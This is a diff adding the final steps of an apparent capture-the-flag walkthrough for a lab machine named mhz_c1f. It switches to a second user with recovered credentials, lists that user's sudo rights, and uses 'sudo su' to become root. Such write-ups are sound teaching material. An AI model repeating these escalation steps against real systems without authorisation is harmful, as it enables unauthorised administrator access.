@@ -123,8 +123,37 @@ mhz_c1f:1@ec1f
 
 there is another username and password
 
+change the user to `mhz_c1f` :
 
+```bash
+first_stage@mhz_c1f:/home/mhz_c1f/Paintings$ su mhz_c1f
+hz_c1f@mhz_c1f:~/Paintings$ id
+uid=1000(mhz_c1f) gid=1000(mhz_c1f) groups=1000(mhz_c1f),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+```
 
+### 5.Privilege Escalation (root)
 
+Just check for sudo permissions :
+
+```bash
+mhz_c1f@mhz_c1f:~/Paintings$ sudo -l
+Matching Defaults entries for mhz_c1f on mhz_c1f:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mhz_c1f may run the following commands on mhz_c1f:
+    (ALL : ALL) ALL
+```
+
+and since we can run any command use the command below :
+
+```bash
+mhz_c1f@mhz_c1f:~/Paintings$ sudo su
+
+root@mhz_c1f:/home/mhz_c1f/Paintings# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+this is how you can get root on this machine :)
 
 
